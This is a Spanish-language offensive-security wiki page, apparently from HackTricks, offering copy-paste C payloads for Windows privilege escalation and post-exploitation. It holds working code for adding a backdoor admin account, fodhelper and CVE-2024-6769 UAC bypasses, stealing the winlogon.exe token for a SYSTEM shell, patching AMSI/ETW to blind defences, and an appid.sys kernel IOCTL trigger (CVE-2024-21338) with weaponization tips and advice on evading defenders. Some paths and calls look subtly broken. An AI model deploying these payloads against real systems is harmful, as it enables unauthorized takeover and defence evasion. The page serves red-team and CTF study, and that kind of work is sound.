# Payloads C de Windows

{{#include ../../banners/hacktricks-training.md}}

Esta página recopila **pequeños fragmentos de C autocontenidos** útiles durante la escalada de privilegios local en Windows o el post-exploitation. Cada payload está diseñado para ser **fácil de copiar y pegar**, solo requiere la API de Windows / runtime de C y puede compilarse con `i686-w64-mingw32-gcc` (x86) o `x86_64-w64-mingw32-gcc` (x64).

> ⚠️ Estos payloads asumen que el proceso ya tiene los privilegios mínimos necesarios para realizar la acción (por ejemplo, `SeDebugPrivilege`, `SeImpersonatePrivilege` o un contexto de integridad media para un bypass de UAC). Están destinados a entornos de **red-team o CTF** en los que la explotación de una vulnerabilidad ha permitido la ejecución arbitraria de código nativo.

---

## Añadir usuario administrador local
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (integridad Media → Alta)
Cuando se ejecuta el binario de confianza **`fodhelper.exe`**, consulta la ruta del registro indicada a continuación **sin filtrar el verbo `DelegateExecute`**. Al colocar nuestro comando bajo esa clave, un atacante puede evadir UAC *sin dejar un archivo en el disco*.<sup>[[1]](#references)</sup>

*Ruta del registro consultada por `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Un PoC mínimo que abre un `cmd.exe` con privilegios elevados:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Probado en Windows 10 22H2 y Windows 11 23H2 (parches de julio de 2025). El bypass sigue funcionando porque Microsoft no ha corregido la comprobación de integridad ausente en la ruta de `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
El remapeo de unidades + activation context cache poisoning sigue funcionando contra builds parcheadas de Windows 10/11 porque `ctfmon.exe` se ejecuta como un proceso de UI confiable con alta integridad que carga sin problemas desde la unidad `C:` suplantada por el caller y reutiliza cualquier redirección de DLL que `CSRSS` haya almacenado en caché. El abuso funciona de la siguiente manera: volver a apuntar `C:` a storage controlado por el atacante, colocar un `msctf.dll` troyanizado, lanzar `ctfmon.exe` para obtener alta integridad y, después, pedir a `CSRSS` que almacene en caché un manifest que redirija una DLL utilizada por un binario auto-elevado (por ejemplo, `fodhelper.exe`), de modo que el siguiente lanzamiento herede tu payload sin mostrar un aviso de UAC.<sup>[[5]](#references)</sup>

Flujo de trabajo práctico:
1. Preparar un árbol `%SystemRoot%\System32` falso y copiar el binario legítimo que se planea secuestrar (a menudo `ctfmon.exe`).
2. Usar `DefineDosDevice(DDD_RAW_TARGET_PATH)` para remapear `C:` dentro del proceso, manteniendo `DDD_NO_BROADCAST_SYSTEM` para que el cambio permanezca local.
3. Colocar la DLL y el manifest en el árbol falso, llamar a `CreateActCtx/ActivateActCtx` para insertar el manifest en la activation-context cache y, después, lanzar el binario auto-elevado para que resuelva la DLL redirigida directamente hacia tu shellcode.
4. Eliminar la entrada de la caché (`sxstrace ClearCache`) o reiniciar cuando se termine para borrar las huellas del atacante.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Consejo de Cleanup: después de obtener SYSTEM, ejecuta `sxstrace Trace -logfile %TEMP%\sxstrace.etl` seguido de `sxstrace Parse` durante las pruebas; si ves el nombre de tu manifest en el log, los defenders también pueden verlo, así que cambia las rutas en cada ejecución.

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Si el proceso actual tiene **ambos** privilegios, `SeDebug` y `SeImpersonate` (algo habitual en muchas cuentas de servicio), puedes robar el token de `winlogon.exe`, duplicarlo e iniciar un proceso con privilegios elevados:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Para una explicación más detallada de cómo funciona, consulta:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Parche de AMSI y ETW en memoria (Defence Evasion)
La mayoría de los motores AV/EDR modernos dependen de **AMSI** y **ETW** para inspeccionar comportamientos maliciosos. Aplicar un parche a ambas interfaces al principio del proceso actual evita que los payloads basados en scripts (por ejemplo, PowerShell y JScript) sean analizados.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*El parche anterior es process-local; iniciar un nuevo PowerShell después de ejecutarlo hará que se ejecute sin inspección de AMSI/ETW.*

---

## Crear un proceso hijo como Protected Process Light (PPL)
Solicita un nivel de protección PPL para un proceso hijo en el momento de su creación mediante `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Esta es una API documentada y solo funcionará si la imagen de destino está firmada para la clase de firmante solicitada (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Niveles utilizados con mayor frecuencia:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Valida el resultado con Process Explorer/Process Hacker comprobando la columna Protection.

---

## Local Service -> Kernel mediante `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` expone un objeto de dispositivo (`\\.\\AppID`) cuyo IOCTL de mantenimiento de smart-hash acepta punteros a funciones proporcionados por el usuario cuando el caller se ejecuta como `LOCAL SERVICE`; Lazarus está abusando de esto para deshabilitar PPL y cargar drivers arbitrarios, por lo que los equipos red team deberían tener preparado un trigger para usarlo en el laboratorio.<sup>[[6]](#references)</sup>

Notas operativas:
- Aún necesitas un token de `LOCAL SERVICE`. Róbaselo a `Schedule` o `WdiServiceHost` usando `SeImpersonatePrivilege`, y haz impersonate antes de acceder al dispositivo para que las comprobaciones de ACL pasen.
- El IOCTL `0x22A018` espera una struct que contenga dos punteros a callbacks (query length + read function). Apunta ambos a stubs en user-mode que preparen un token overwrite o mapeen primitivas de ring-0, pero mantén los buffers como RWX para que KernelPatchGuard no se bloquee a mitad de la cadena.
- Después de tener éxito, sal de la impersonation y revierte el handle del dispositivo; los defenders ahora buscan handles inesperados hacia `Device\\AppID`, así que ciérralo inmediatamente una vez obtenidos los privilegios.

<details>
<summary>C - Skeleton trigger para el abuso de smart-hash de `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Corrección mínima para un build weaponized: mapea una sección RWX con `VirtualAlloc`, copia allí tu stub de duplicación de tokens, establece `KernelThunk = section` y, una vez que `DeviceIoControl` devuelva el control, deberías ser SYSTEM incluso bajo PPL.

---

## Referencias

- [1] [Primera entrada: bienvenida y fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – launcher mínimo de procesos PPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [Función UpdateProcThreadAttribute (aplicaciones Win32) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Una nueva cadena de exploits permite realizar UAC bypass en Windows](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus y el rootkit FudModule: más allá de BYOVD con un Zero-Day de Admin-to-Kernel](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
